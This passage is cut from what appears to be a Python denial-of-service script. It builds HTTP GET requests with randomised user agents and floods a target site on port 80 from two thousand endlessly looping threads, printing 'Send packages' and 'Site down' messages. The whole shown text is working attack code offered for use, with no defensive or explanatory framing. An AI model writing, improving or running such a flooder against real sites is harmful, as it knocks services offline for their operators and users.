    Accept-Encoding: gzip,deflate
    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
    Keep-Alive: 115
    Connection: keep-alive'''
    def dos():
        while 1:
            try:
                s = socket.socket()
                s.connect((site, 80))
                packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                s.sendto(packet, (site, 80))    
                s.send(packet)
                print(Z+time.ctime(time.time()) + ' Send packages->'+site+E)
            except socket.error:
                print(F+'Site down'+E)
                exit(1)
    def dos2():
        while 1:
            dos()

    for i in range(1000):
        t[i] = threading.Thread(target=dos)
    for h in range(1000):
        l[h] = threading.Thread(target=dos2)
    for k in range(1000):
        t[k].start()
        l[k].start()